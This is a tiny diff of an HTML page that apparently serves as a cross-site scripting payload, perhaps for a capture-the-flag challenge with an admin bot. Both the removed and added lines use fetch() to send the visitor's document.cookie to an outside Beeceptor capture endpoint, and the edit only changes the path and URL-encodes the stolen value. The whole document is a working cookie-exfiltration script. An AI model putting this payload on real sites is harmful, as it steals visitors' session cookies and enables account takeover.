@@ -1,8 +1,8 @@
 <html>
 <body>
 <script>
-  // Send the bot's cookies to Beeceptor so we can see them
-  fetch('https://https-sakina.free.beeceptor.com/steal?c=' + document.cookie);
+  // Send cookies to Beeceptor visibly in the URL
+  fetch('https://https-sakina.free.beeceptor.com/cookies?data=' + encodeURIComponent(document.cookie));
 </script>
 </body>
 </html>
